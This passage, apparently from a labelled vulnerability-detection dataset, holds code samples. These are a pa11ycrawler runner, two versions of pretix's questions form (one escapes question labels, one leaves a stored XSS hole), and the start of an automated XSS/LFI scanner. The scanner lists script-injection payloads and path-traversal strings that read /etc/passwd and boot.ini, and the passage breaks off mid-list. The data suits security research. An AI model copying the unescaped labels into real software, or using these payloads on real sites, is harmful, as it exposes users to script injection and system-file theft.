{courses_dir}'.format(\n                zipped_course=zipped_course,\n                courses_dir=self.imports_dir,\n            )\n        )\n\n    def generate_html_reports(self):\n        \"\"\"\n        Runs pa11ycrawler json-to-html\n        \"\"\"\n        cmd_str = (\n            'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}'\n        ).format(report_dir=self.pa11y_report_dir)\n\n        sh(cmd_str)\n\n    @property\n    def cmd(self):\n        \"\"\"\n        Runs pa11ycrawler as staff user against the test course.\n        \"\"\"\n        cmd_str = (\n            'pa11ycrawler run {start_urls} '\n            '--pa11ycrawler-allowed-domains={allowed_domains} '\n            '--pa11ycrawler-reports-dir={report_dir} '\n            '--pa11ycrawler-deny-url-matcher={dont_go_here} '\n            '--pa11y-reporter=\"{reporter}\" '\n            '--depth-limit={depth} '\n        ).format(\n            start_urls=' '.join(self.start_urls),\n            allowed_domains='localhost',\n            report_dir=self.pa11y_report_dir,\n            reporter=\"1.0-json\",\n            dont_go_here=\"logout\",\n            depth=\"6\",\n        )\n        return cmd_str\n/n/n/n", "label": 1}, {"id": "affc6254a8316643d4afe9e8b7f8cd288c86ca1f", "code": "src/pretix/base/forms/questions.py/n/nimport copy\nimport logging\nfrom decimal import Decimal\n\nimport dateutil.parser\nimport pytz\nimport vat_moss.errors\nimport vat_moss.id\nfrom django import forms\nfrom django.contrib import messages\nfrom django.core.exceptions import ValidationError\nfrom django.utils.html import escape\nfrom django.utils.safestring import mark_safe\nfrom django.utils.translation import ugettext_lazy as _\n\nfrom pretix.base.forms.widgets import (\n    BusinessBooleanRadio, DatePickerWidget, SplitDateTimePickerWidget,\n    TimePickerWidget, UploadedFileWidget,\n)\nfrom pretix.base.models import InvoiceAddress, Question\nfrom pretix.base.models.tax import EU_COUNTRIES\nfrom pretix.base.settings import PERSON_NAME_SCHEMES\nfrom pretix.base.templatetags.rich_text import rich_text\nfrom pretix.control.forms import SplitDateTimeField\nfrom pretix.helpers.i18n import get_format_without_seconds\nfrom pretix.presale.signals import question_form_fields\n\nlogger = logging.getLogger(__name__)\n\n\nclass NamePartsWidget(forms.MultiWidget):\n    widget = forms.TextInput\n\n    def __init__(self, scheme: dict, field: forms.Field, attrs=None):\n        widgets = []\n        self.scheme = scheme\n        self.field = field\n        for fname, label, size in self.scheme['fields']:\n            a = copy.copy(attrs) or {}\n            a['data-fname'] = fname\n            widgets.append(self.widget(attrs=a))\n        super().__init__(widgets, attrs)\n\n    def decompress(self, value):\n        if value is None:\n            return None\n        data = []\n        for i, field in enumerate(self.scheme['fields']):\n            fname, label, size = field\n            data.append(value.get(fname, \"\"))\n        if '_legacy' in value and not data[-1]:\n            data[-1] = value.get('_legacy', '')\n        return data\n\n    def render(self, name: str, value, attrs=None, renderer=None) -> str:\n        if not isinstance(value, list):\n            value = self.decompress(value)\n        output = []\n        final_attrs = self.build_attrs(attrs or dict())\n        if 'required' in final_attrs:\n            del final_attrs['required']\n        id_ = final_attrs.get('id', None)\n        for i, widget in enumerate(self.widgets):\n            try:\n                widget_value = value[i]\n            except (IndexError, TypeError):\n                widget_value = None\n            if id_:\n                final_attrs = dict(\n                    final_attrs,\n                    id='%s_%s' % (id_, i),\n                    title=self.scheme['fields'][i][1],\n                    placeholder=self.scheme['fields'][i][1],\n                )\n                final_attrs['data-size'] = self.scheme['fields'][i][2]\n            output.append(widget.render(name + '_%s' % i, widget_value, final_attrs, renderer=renderer))\n        return mark_safe(self.format_output(output))\n\n    def format_output(self, rendered_widgets) -> str:\n        return '<div class=\"nameparts-form-group\">%s</div>' % ''.join(rendered_widgets)\n\n\nclass NamePartsFormField(forms.MultiValueField):\n    widget = NamePartsWidget\n\n    def compress(self, data_list) -> dict:\n        data = {}\n        data['_scheme'] = self.scheme_name\n        for i, value in enumerate(data_list):\n            data[self.scheme['fields'][i][0]] = value or ''\n        return data\n\n    def __init__(self, *args, **kwargs):\n        fields = []\n        defaults = {\n            'widget': self.widget,\n            'max_length': kwargs.pop('max_length', None),\n        }\n        self.scheme_name = kwargs.pop('scheme')\n        self.scheme = PERSON_NAME_SCHEMES.get(self.scheme_name)\n        self.one_required = kwargs.get('required', True)\n        require_all_fields = kwargs.pop('require_all_fields', False)\n        kwargs['required'] = False\n        kwargs['widget'] = (kwargs.get('widget') or self.widget)(\n            scheme=self.scheme, field=self, **kwargs.pop('widget_kwargs', {})\n        )\n        defaults.update(**kwargs)\n        for fname, label, size in self.scheme['fields']:\n            defaults['label'] = label\n            field = forms.CharField(**defaults)\n            field.part_name = fname\n            fields.append(field)\n        super().__init__(\n            fields=fields, require_all_fields=False, *args, **kwargs\n        )\n        self.require_all_fields = require_all_fields\n        self.required = self.one_required\n\n    def clean(self, value) -> dict:\n        value = super().clean(value)\n        if self.one_required and (not value or not any(v for v in value)):\n            raise forms.ValidationError(self.error_messages['required'], code='required')\n        if self.require_all_fields and not all(v for v in value):\n            raise forms.ValidationError(self.error_messages['incomplete'], code='required')\n        return value\n\n\nclass BaseQuestionsForm(forms.Form):\n    \"\"\"\n    This form class is responsible for asking order-related questions. This includes\n    the attendee name for admission tickets, if the corresponding setting is enabled,\n    as well as additional questions defined by the organizer.\n    \"\"\"\n\n    def __init__(self, *args, **kwargs):\n        \"\"\"\n        Takes two additional keyword arguments:\n\n        :param cartpos: The cart position the form should be for\n        :param event: The event this belongs to\n        \"\"\"\n        cartpos = self.cartpos = kwargs.pop('cartpos', None)\n        orderpos = self.orderpos = kwargs.pop('orderpos', None)\n        pos = cartpos or orderpos\n        item = pos.item\n        questions = pos.item.questions_to_ask\n        event = kwargs.pop('event')\n\n        super().__init__(*args, **kwargs)\n\n        if item.admission and event.settings.attendee_names_asked:\n            self.fields['attendee_name_parts'] = NamePartsFormField(\n                max_length=255,\n                required=event.settings.attendee_names_required,\n                scheme=event.settings.name_scheme,\n                label=_('Attendee name'),\n                initial=(cartpos.attendee_name_parts if cartpos else orderpos.attendee_name_parts),\n            )\n        if item.admission and event.settings.attendee_emails_asked:\n            self.fields['attendee_email'] = forms.EmailField(\n                required=event.settings.attendee_emails_required,\n                label=_('Attendee email'),\n                initial=(cartpos.attendee_email if cartpos else orderpos.attendee_email)\n            )\n\n        for q in questions:\n            # Do we already have an answer? Provide it as the initial value\n            answers = [a for a in pos.answerlist if a.question_id == q.id]\n            if answers:\n                initial = answers[0]\n            else:\n                initial = None\n            tz = pytz.timezone(event.settings.timezone)\n            help_text = rich_text(q.help_text)\n            label = escape(q.question)  # django-bootstrap3 calls mark_safe\n            if q.type == Question.TYPE_BOOLEAN:\n                if q.required:\n                    # For some reason, django-bootstrap3 does not set the required attribute\n                    # itself.\n                    widget = forms.CheckboxInput(attrs={'required': 'required'})\n                else:\n                    widget = forms.CheckboxInput()\n\n                if initial:\n                    initialbool = (initial.answer == \"True\")\n                else:\n                    initialbool = False\n\n                field = forms.BooleanField(\n                    label=label, required=q.required,\n                    help_text=help_text,\n                    initial=initialbool, widget=widget,\n                )\n            elif q.type == Question.TYPE_NUMBER:\n                field = forms.DecimalField(\n                    label=label, required=q.required,\n                    help_text=q.help_text,\n                    initial=initial.answer if initial else None,\n                    min_value=Decimal('0.00'),\n                )\n            elif q.type == Question.TYPE_STRING:\n                field = forms.CharField(\n                    label=label, required=q.required,\n                    help_text=help_text,\n                    initial=initial.answer if initial else None,\n                )\n            elif q.type == Question.TYPE_TEXT:\n                field = forms.CharField(\n                    label=label, required=q.required,\n                    help_text=help_text,\n                    widget=forms.Textarea,\n                    initial=initial.answer if initial else None,\n                )\n            elif q.type == Question.TYPE_CHOICE:\n                field = forms.ModelChoiceField(\n                    queryset=q.options,\n                    label=label, required=q.required,\n                    help_text=help_text,\n                    widget=forms.Select,\n                    empty_label='',\n                    initial=initial.options.first() if initial else None,\n                )\n            elif q.type == Question.TYPE_CHOICE_MULTIPLE:\n                field = forms.ModelMultipleChoiceField(\n                    queryset=q.options,\n                    label=label, required=q.required,\n                    help_text=help_text,\n                    widget=forms.CheckboxSelectMultiple,\n                    initial=initial.options.all() if initial else None,\n                )\n            elif q.type == Question.TYPE_FILE:\n                field = forms.FileField(\n                    label=label, required=q.required,\n                    help_text=help_text,\n                    initial=initial.file if initial else None,\n                    widget=UploadedFileWidget(position=pos, event=event, answer=initial),\n                )\n            elif q.type == Question.TYPE_DATE:\n                field = forms.DateField(\n                    label=label, required=q.required,\n                    help_text=help_text,\n                    initial=dateutil.parser.parse(initial.answer).date() if initial and initial.answer else None,\n                    widget=DatePickerWidget(),\n                )\n            elif q.type == Question.TYPE_TIME:\n                field = forms.TimeField(\n                    label=label, required=q.required,\n                    help_text=help_text,\n                    initial=dateutil.parser.parse(initial.answer).time() if initial and initial.answer else None,\n                    widget=TimePickerWidget(time_format=get_format_without_seconds('TIME_INPUT_FORMATS')),\n                )\n            elif q.type == Question.TYPE_DATETIME:\n                field = SplitDateTimeField(\n                    label=label, required=q.required,\n                    help_text=help_text,\n                    initial=dateutil.parser.parse(initial.answer).astimezone(tz) if initial and initial.answer else None,\n                    widget=SplitDateTimePickerWidget(time_format=get_format_without_seconds('TIME_INPUT_FORMATS')),\n                )\n            field.question = q\n            if answers:\n                # Cache the answer object for later use\n                field.answer = answers[0]\n            self.fields['question_%s' % q.id] = field\n\n        responses = question_form_fields.send(sender=event, position=pos)\n        data = pos.meta_info_data\n        for r, response in sorted(responses, key=lambda r: str(r[0])):\n            for key, value in response.items():\n                # We need to be this explicit, since OrderedDict.update does not retain ordering\n                self.fields[key] = value\n                value.initial = data.get('question_form_data', {}).get(key)\n\n\nclass BaseInvoiceAddressForm(forms.ModelForm):\n    vat_warning = False\n\n    class Meta:\n        model = InvoiceAddress\n        fields = ('is_business', 'company', 'name_parts', 'street', 'zipcode', 'city', 'country', 'vat_id',\n                  'internal_reference', 'beneficiary')\n        widgets = {\n            'is_business': BusinessBooleanRadio,\n            'street': forms.Textarea(attrs={'rows': 2, 'placeholder': _('Street and Number')}),\n            'beneficiary': forms.Textarea(attrs={'rows': 3}),\n            'company': forms.TextInput(attrs={'data-display-dependency': '#id_is_business_1'}),\n            'vat_id': forms.TextInput(attrs={'data-display-dependency': '#id_is_business_1'}),\n            'internal_reference': forms.TextInput,\n        }\n        labels = {\n            'is_business': ''\n        }\n\n    def __init__(self, *args, **kwargs):\n        self.event = event = kwargs.pop('event')\n        self.request = kwargs.pop('request', None)\n        self.validate_vat_id = kwargs.pop('validate_vat_id')\n        self.all_optional = kwargs.pop('all_optional', False)\n        super().__init__(*args, **kwargs)\n        if not event.settings.invoice_address_vatid:\n            del self.fields['vat_id']\n\n        if not event.settings.invoice_address_required or self.all_optional:\n            for k, f in self.fields.items():\n                f.required = False\n                f.widget.is_required = False\n                if 'required' in f.widget.attrs:\n                    del f.widget.attrs['required']\n        elif event.settings.invoice_address_company_required and not self.all_optional:\n            self.initial['is_business'] = True\n\n            self.fields['is_business'].widget = BusinessBooleanRadio(require_business=True)\n            self.fields['company'].required = True\n            self.fields['company'].widget.is_required = True\n            self.fields['company'].widget.attrs['required'] = 'required'\n            del self.fields['company'].widget.attrs['data-display-dependency']\n            if 'vat_id' in self.fields:\n                del self.fields['vat_id'].widget.attrs['data-display-dependency']\n\n        self.fields['name_parts'] = NamePartsFormField(\n            max_length=255,\n            required=event.settings.invoice_name_required and not self.all_optional,\n            scheme=event.settings.name_scheme,\n            label=_('Name'),\n            initial=(self.instance.name_parts if self.instance else self.instance.name_parts),\n        )\n        if event.settings.invoice_address_required and not event.settings.invoice_address_company_required and not self.all_optional:\n            self.fields['name_parts'].widget.attrs['data-required-if'] = '#id_is_business_0'\n            self.fields['name_parts'].widget.attrs['data-no-required-attr'] = '1'\n            self.fields['company'].widget.attrs['data-required-if'] = '#id_is_business_1'\n\n        if not event.settings.invoice_address_beneficiary:\n            del self.fields['beneficiary']\n\n    def clean(self):\n        data = self.cleaned_data\n        if not data.get('is_business'):\n            data['company'] = ''\n        if self.event.settings.invoice_address_required:\n            if data.get('is_business') and not data.get('company'):\n                raise ValidationError(_('You need to provide a company name.'))\n            if not data.get('is_business') and not data.get('name_parts'):\n                raise ValidationError(_('You need to provide your name.'))\n\n        if 'vat_id' in self.changed_data or not data.get('vat_id'):\n            self.instance.vat_id_validated = False\n\n        self.instance.name_parts = data.get('name_parts')\n\n        if self.validate_vat_id and self.instance.vat_id_validated and 'vat_id' not in self.changed_data:\n            pass\n        elif self.validate_vat_id and data.get('is_business') and data.get('country') in EU_COUNTRIES and data.get('vat_id'):\n            if data.get('vat_id')[:2] != str(data.get('country')):\n                raise ValidationError(_('Your VAT ID does not match the selected country.'))\n            try:\n                result = vat_moss.id.validate(data.get('vat_id'))\n                if result:\n                    country_code, normalized_id, company_name = result\n                    self.instance.vat_id_validated = True\n                    self.instance.vat_id = normalized_id\n            except (vat_moss.errors.InvalidError, ValueError):\n                raise ValidationError(_('This VAT ID is not valid. Please re-check your input.'))\n            except vat_moss.errors.WebServiceUnavailableError:\n                logger.exception('VAT ID checking failed for country {}'.format(data.get('country')))\n                self.instance.vat_id_validated = False\n                if self.request and self.vat_warning:\n                    messages.warning(self.request, _('Your VAT ID could not be checked, as the VAT checking service of '\n                                                     'your country is currently not available. We will therefore '\n                                                     'need to charge VAT on your invoice. You can get the tax amount '\n                                                     'back via the VAT reimbursement process.'))\n            except vat_moss.errors.WebServiceError:\n                logger.exception('VAT ID checking failed for country {}'.format(data.get('country')))\n                self.instance.vat_id_validated = False\n                if self.request and self.vat_warning:\n                    messages.warning(self.request, _('Your VAT ID could not be checked, as the VAT checking service of '\n                                                     'your country returned an incorrect result. We will therefore '\n                                                     'need to charge VAT on your invoice. Please contact support to '\n                                                     'resolve this manually.'))\n        else:\n            self.instance.vat_id_validated = False\n\n\nclass BaseInvoiceNameForm(BaseInvoiceAddressForm):\n\n    def __init__(self, *args, **kwargs):\n        super().__init__(*args, **kwargs)\n        for f in list(self.fields.keys()):\n            if f != 'name':\n                del self.fields[f]\n/n/n/n", "label": 0}, {"id": "affc6254a8316643d4afe9e8b7f8cd288c86ca1f", "code": "/src/pretix/base/forms/questions.py/n/nimport copy\nimport logging\nfrom decimal import Decimal\n\nimport dateutil.parser\nimport pytz\nimport vat_moss.errors\nimport vat_moss.id\nfrom django import forms\nfrom django.contrib import messages\nfrom django.core.exceptions import ValidationError\nfrom django.utils.safestring import mark_safe\nfrom django.utils.translation import ugettext_lazy as _\n\nfrom pretix.base.forms.widgets import (\n    BusinessBooleanRadio, DatePickerWidget, SplitDateTimePickerWidget,\n    TimePickerWidget, UploadedFileWidget,\n)\nfrom pretix.base.models import InvoiceAddress, Question\nfrom pretix.base.models.tax import EU_COUNTRIES\nfrom pretix.base.settings import PERSON_NAME_SCHEMES\nfrom pretix.base.templatetags.rich_text import rich_text\nfrom pretix.control.forms import SplitDateTimeField\nfrom pretix.helpers.i18n import get_format_without_seconds\nfrom pretix.presale.signals import question_form_fields\n\nlogger = logging.getLogger(__name__)\n\n\nclass NamePartsWidget(forms.MultiWidget):\n    widget = forms.TextInput\n\n    def __init__(self, scheme: dict, field: forms.Field, attrs=None):\n        widgets = []\n        self.scheme = scheme\n        self.field = field\n        for fname, label, size in self.scheme['fields']:\n            a = copy.copy(attrs) or {}\n            a['data-fname'] = fname\n            widgets.append(self.widget(attrs=a))\n        super().__init__(widgets, attrs)\n\n    def decompress(self, value):\n        if value is None:\n            return None\n        data = []\n        for i, field in enumerate(self.scheme['fields']):\n            fname, label, size = field\n            data.append(value.get(fname, \"\"))\n        if '_legacy' in value and not data[-1]:\n            data[-1] = value.get('_legacy', '')\n        return data\n\n    def render(self, name: str, value, attrs=None, renderer=None) -> str:\n        if not isinstance(value, list):\n            value = self.decompress(value)\n        output = []\n        final_attrs = self.build_attrs(attrs or dict())\n        if 'required' in final_attrs:\n            del final_attrs['required']\n        id_ = final_attrs.get('id', None)\n        for i, widget in enumerate(self.widgets):\n            try:\n                widget_value = value[i]\n            except (IndexError, TypeError):\n                widget_value = None\n            if id_:\n                final_attrs = dict(\n                    final_attrs,\n                    id='%s_%s' % (id_, i),\n                    title=self.scheme['fields'][i][1],\n                    placeholder=self.scheme['fields'][i][1],\n                )\n                final_attrs['data-size'] = self.scheme['fields'][i][2]\n            output.append(widget.render(name + '_%s' % i, widget_value, final_attrs, renderer=renderer))\n        return mark_safe(self.format_output(output))\n\n    def format_output(self, rendered_widgets) -> str:\n        return '<div class=\"nameparts-form-group\">%s</div>' % ''.join(rendered_widgets)\n\n\nclass NamePartsFormField(forms.MultiValueField):\n    widget = NamePartsWidget\n\n    def compress(self, data_list) -> dict:\n        data = {}\n        data['_scheme'] = self.scheme_name\n        for i, value in enumerate(data_list):\n            data[self.scheme['fields'][i][0]] = value or ''\n        return data\n\n    def __init__(self, *args, **kwargs):\n        fields = []\n        defaults = {\n            'widget': self.widget,\n            'max_length': kwargs.pop('max_length', None),\n        }\n        self.scheme_name = kwargs.pop('scheme')\n        self.scheme = PERSON_NAME_SCHEMES.get(self.scheme_name)\n        self.one_required = kwargs.get('required', True)\n        require_all_fields = kwargs.pop('require_all_fields', False)\n        kwargs['required'] = False\n        kwargs['widget'] = (kwargs.get('widget') or self.widget)(\n            scheme=self.scheme, field=self, **kwargs.pop('widget_kwargs', {})\n        )\n        defaults.update(**kwargs)\n        for fname, label, size in self.scheme['fields']:\n            defaults['label'] = label\n            field = forms.CharField(**defaults)\n            field.part_name = fname\n            fields.append(field)\n        super().__init__(\n            fields=fields, require_all_fields=False, *args, **kwargs\n        )\n        self.require_all_fields = require_all_fields\n        self.required = self.one_required\n\n    def clean(self, value) -> dict:\n        value = super().clean(value)\n        if self.one_required and (not value or not any(v for v in value)):\n            raise forms.ValidationError(self.error_messages['required'], code='required')\n        if self.require_all_fields and not all(v for v in value):\n            raise forms.ValidationError(self.error_messages['incomplete'], code='required')\n        return value\n\n\nclass BaseQuestionsForm(forms.Form):\n    \"\"\"\n    This form class is responsible for asking order-related questions. This includes\n    the attendee name for admission tickets, if the corresponding setting is enabled,\n    as well as additional questions defined by the organizer.\n    \"\"\"\n\n    def __init__(self, *args, **kwargs):\n        \"\"\"\n        Takes two additional keyword arguments:\n\n        :param cartpos: The cart position the form should be for\n        :param event: The event this belongs to\n        \"\"\"\n        cartpos = self.cartpos = kwargs.pop('cartpos', None)\n        orderpos = self.orderpos = kwargs.pop('orderpos', None)\n        pos = cartpos or orderpos\n        item = pos.item\n        questions = pos.item.questions_to_ask\n        event = kwargs.pop('event')\n\n        super().__init__(*args, **kwargs)\n\n        if item.admission and event.settings.attendee_names_asked:\n            self.fields['attendee_name_parts'] = NamePartsFormField(\n                max_length=255,\n                required=event.settings.attendee_names_required,\n                scheme=event.settings.name_scheme,\n                label=_('Attendee name'),\n                initial=(cartpos.attendee_name_parts if cartpos else orderpos.attendee_name_parts),\n            )\n        if item.admission and event.settings.attendee_emails_asked:\n            self.fields['attendee_email'] = forms.EmailField(\n                required=event.settings.attendee_emails_required,\n                label=_('Attendee email'),\n                initial=(cartpos.attendee_email if cartpos else orderpos.attendee_email)\n            )\n\n        for q in questions:\n            # Do we already have an answer? Provide it as the initial value\n            answers = [a for a in pos.answerlist if a.question_id == q.id]\n            if answers:\n                initial = answers[0]\n            else:\n                initial = None\n            tz = pytz.timezone(event.settings.timezone)\n            help_text = rich_text(q.help_text)\n            if q.type == Question.TYPE_BOOLEAN:\n                if q.required:\n                    # For some reason, django-bootstrap3 does not set the required attribute\n                    # itself.\n                    widget = forms.CheckboxInput(attrs={'required': 'required'})\n                else:\n                    widget = forms.CheckboxInput()\n\n                if initial:\n                    initialbool = (initial.answer == \"True\")\n                else:\n                    initialbool = False\n\n                field = forms.BooleanField(\n                    label=q.question, required=q.required,\n                    help_text=help_text,\n                    initial=initialbool, widget=widget,\n                )\n            elif q.type == Question.TYPE_NUMBER:\n                field = forms.DecimalField(\n                    label=q.question, required=q.required,\n                    help_text=q.help_text,\n                    initial=initial.answer if initial else None,\n                    min_value=Decimal('0.00'),\n                )\n            elif q.type == Question.TYPE_STRING:\n                field = forms.CharField(\n                    label=q.question, required=q.required,\n                    help_text=help_text,\n                    initial=initial.answer if initial else None,\n                )\n            elif q.type == Question.TYPE_TEXT:\n                field = forms.CharField(\n                    label=q.question, required=q.required,\n                    help_text=help_text,\n                    widget=forms.Textarea,\n                    initial=initial.answer if initial else None,\n                )\n            elif q.type == Question.TYPE_CHOICE:\n                field = forms.ModelChoiceField(\n                    queryset=q.options,\n                    label=q.question, required=q.required,\n                    help_text=help_text,\n                    widget=forms.Select,\n                    empty_label='',\n                    initial=initial.options.first() if initial else None,\n                )\n            elif q.type == Question.TYPE_CHOICE_MULTIPLE:\n                field = forms.ModelMultipleChoiceField(\n                    queryset=q.options,\n                    label=q.question, required=q.required,\n                    help_text=help_text,\n                    widget=forms.CheckboxSelectMultiple,\n                    initial=initial.options.all() if initial else None,\n                )\n            elif q.type == Question.TYPE_FILE:\n                field = forms.FileField(\n                    label=q.question, required=q.required,\n                    help_text=help_text,\n                    initial=initial.file if initial else None,\n                    widget=UploadedFileWidget(position=pos, event=event, answer=initial),\n                )\n            elif q.type == Question.TYPE_DATE:\n                field = forms.DateField(\n                    label=q.question, required=q.required,\n                    help_text=help_text,\n                    initial=dateutil.parser.parse(initial.answer).date() if initial and initial.answer else None,\n                    widget=DatePickerWidget(),\n                )\n            elif q.type == Question.TYPE_TIME:\n                field = forms.TimeField(\n                    label=q.question, required=q.required,\n                    help_text=help_text,\n                    initial=dateutil.parser.parse(initial.answer).time() if initial and initial.answer else None,\n                    widget=TimePickerWidget(time_format=get_format_without_seconds('TIME_INPUT_FORMATS')),\n                )\n            elif q.type == Question.TYPE_DATETIME:\n                field = SplitDateTimeField(\n                    label=q.question, required=q.required,\n                    help_text=help_text,\n                    initial=dateutil.parser.parse(initial.answer).astimezone(tz) if initial and initial.answer else None,\n                    widget=SplitDateTimePickerWidget(time_format=get_format_without_seconds('TIME_INPUT_FORMATS')),\n                )\n            field.question = q\n            if answers:\n                # Cache the answer object for later use\n                field.answer = answers[0]\n            self.fields['question_%s' % q.id] = field\n\n        responses = question_form_fields.send(sender=event, position=pos)\n        data = pos.meta_info_data\n        for r, response in sorted(responses, key=lambda r: str(r[0])):\n            for key, value in response.items():\n                # We need to be this explicit, since OrderedDict.update does not retain ordering\n                self.fields[key] = value\n                value.initial = data.get('question_form_data', {}).get(key)\n\n\nclass BaseInvoiceAddressForm(forms.ModelForm):\n    vat_warning = False\n\n    class Meta:\n        model = InvoiceAddress\n        fields = ('is_business', 'company', 'name_parts', 'street', 'zipcode', 'city', 'country', 'vat_id',\n                  'internal_reference', 'beneficiary')\n        widgets = {\n            'is_business': BusinessBooleanRadio,\n            'street': forms.Textarea(attrs={'rows': 2, 'placeholder': _('Street and Number')}),\n            'beneficiary': forms.Textarea(attrs={'rows': 3}),\n            'company': forms.TextInput(attrs={'data-display-dependency': '#id_is_business_1'}),\n            'vat_id': forms.TextInput(attrs={'data-display-dependency': '#id_is_business_1'}),\n            'internal_reference': forms.TextInput,\n        }\n        labels = {\n            'is_business': ''\n        }\n\n    def __init__(self, *args, **kwargs):\n        self.event = event = kwargs.pop('event')\n        self.request = kwargs.pop('request', None)\n        self.validate_vat_id = kwargs.pop('validate_vat_id')\n        self.all_optional = kwargs.pop('all_optional', False)\n        super().__init__(*args, **kwargs)\n        if not event.settings.invoice_address_vatid:\n            del self.fields['vat_id']\n\n        if not event.settings.invoice_address_required or self.all_optional:\n            for k, f in self.fields.items():\n                f.required = False\n                f.widget.is_required = False\n                if 'required' in f.widget.attrs:\n                    del f.widget.attrs['required']\n        elif event.settings.invoice_address_company_required and not self.all_optional:\n            self.initial['is_business'] = True\n\n            self.fields['is_business'].widget = BusinessBooleanRadio(require_business=True)\n            self.fields['company'].required = True\n            self.fields['company'].widget.is_required = True\n            self.fields['company'].widget.attrs['required'] = 'required'\n            del self.fields['company'].widget.attrs['data-display-dependency']\n            if 'vat_id' in self.fields:\n                del self.fields['vat_id'].widget.attrs['data-display-dependency']\n\n        self.fields['name_parts'] = NamePartsFormField(\n            max_length=255,\n            required=event.settings.invoice_name_required and not self.all_optional,\n            scheme=event.settings.name_scheme,\n            label=_('Name'),\n            initial=(self.instance.name_parts if self.instance else self.instance.name_parts),\n        )\n        if event.settings.invoice_address_required and not event.settings.invoice_address_company_required and not self.all_optional:\n            self.fields['name_parts'].widget.attrs['data-required-if'] = '#id_is_business_0'\n            self.fields['name_parts'].widget.attrs['data-no-required-attr'] = '1'\n            self.fields['company'].widget.attrs['data-required-if'] = '#id_is_business_1'\n\n        if not event.settings.invoice_address_beneficiary:\n            del self.fields['beneficiary']\n\n    def clean(self):\n        data = self.cleaned_data\n        if not data.get('is_business'):\n            data['company'] = ''\n        if self.event.settings.invoice_address_required:\n            if data.get('is_business') and not data.get('company'):\n                raise ValidationError(_('You need to provide a company name.'))\n            if not data.get('is_business') and not data.get('name_parts'):\n                raise ValidationError(_('You need to provide your name.'))\n\n        if 'vat_id' in self.changed_data or not data.get('vat_id'):\n            self.instance.vat_id_validated = False\n\n        self.instance.name_parts = data.get('name_parts')\n\n        if self.validate_vat_id and self.instance.vat_id_validated and 'vat_id' not in self.changed_data:\n            pass\n        elif self.validate_vat_id and data.get('is_business') and data.get('country') in EU_COUNTRIES and data.get('vat_id'):\n            if data.get('vat_id')[:2] != str(data.get('country')):\n                raise ValidationError(_('Your VAT ID does not match the selected country.'))\n            try:\n                result = vat_moss.id.validate(data.get('vat_id'))\n                if result:\n                    country_code, normalized_id, company_name = result\n                    self.instance.vat_id_validated = True\n                    self.instance.vat_id = normalized_id\n            except (vat_moss.errors.InvalidError, ValueError):\n                raise ValidationError(_('This VAT ID is not valid. Please re-check your input.'))\n            except vat_moss.errors.WebServiceUnavailableError:\n                logger.exception('VAT ID checking failed for country {}'.format(data.get('country')))\n                self.instance.vat_id_validated = False\n                if self.request and self.vat_warning:\n                    messages.warning(self.request, _('Your VAT ID could not be checked, as the VAT checking service of '\n                                                     'your country is currently not available. We will therefore '\n                                                     'need to charge VAT on your invoice. You can get the tax amount '\n                                                     'back via the VAT reimbursement process.'))\n            except vat_moss.errors.WebServiceError:\n                logger.exception('VAT ID checking failed for country {}'.format(data.get('country')))\n                self.instance.vat_id_validated = False\n                if self.request and self.vat_warning:\n                    messages.warning(self.request, _('Your VAT ID could not be checked, as the VAT checking service of '\n                                                     'your country returned an incorrect result. We will therefore '\n                                                     'need to charge VAT on your invoice. Please contact support to '\n                                                     'resolve this manually.'))\n        else:\n            self.instance.vat_id_validated = False\n\n\nclass BaseInvoiceNameForm(BaseInvoiceAddressForm):\n\n    def __init__(self, *args, **kwargs):\n        super().__init__(*args, **kwargs)\n        for f in list(self.fields.keys()):\n            if f != 'name':\n                del self.fields[f]\n/n/n/n", "label": 1}, {"id": "73d12b579a488013c561179bb95b1d45c2b48e2f", "code": "scripts/beaxssf.py/n/n#! python\n###############################################\n#   BEstAutomaticXSSFinder                    #\n#   Author: malwrforensics                    #\n#   Contact: malwr at malwrforensics dot com  #\n###############################################\n\nimport sys\nimport os\nimport requests\nimport re\n\nDEBUG = 0\nxss_attacks = [ \"<script>alert(1);</script>\", \"<script>prompt(1)</script>\",\n                \"<img src=x onerror=prompt(/test/)>\",\n                \"\\\"><script>alert(1);</script><div id=\\\"x\", \"</script><script>alert(1);</script>\",\n                \"</title><script>alert(1);</script>\", \"<body background=\\\"javascript:alert(1)\\\">\",\n                \"<img src=test123456.jpg onerror=alert(1)>\"]\n\nlfi_attacks = [\n                #linux\n                '../../etc/passwd', '../../../etc/passwd', '../../../../etc/passwd',\n                '../../../../../etc/passwd', '../../../../../../etc/passwd',\n                '../../../../../../../etc/passwd', '../../../../../../../../etc/passwd',\n                '%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',\n                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',\n                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',\n                '../../etc/passwd%00', '../../../etc/passwd%00', '../../../../etc/passwd%00',\n                '../../../../../etc/passwd%00', '../../../../../../etc/passwd%00',\n                '../../../../../../../etc/passwd%00', '../../../../../../../../etc/passwd%00',\n                '%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',\n                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',\n                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',\n\n                #windows\n                '../../boot.ini', '../../../boot.ini', '../../../../boot.ini',\n                '../../../../../boot.ini', '../../../../../../boot.ini',\n                '../../../../../../../boot.ini', '../../../../../../../../boot.ini',\n              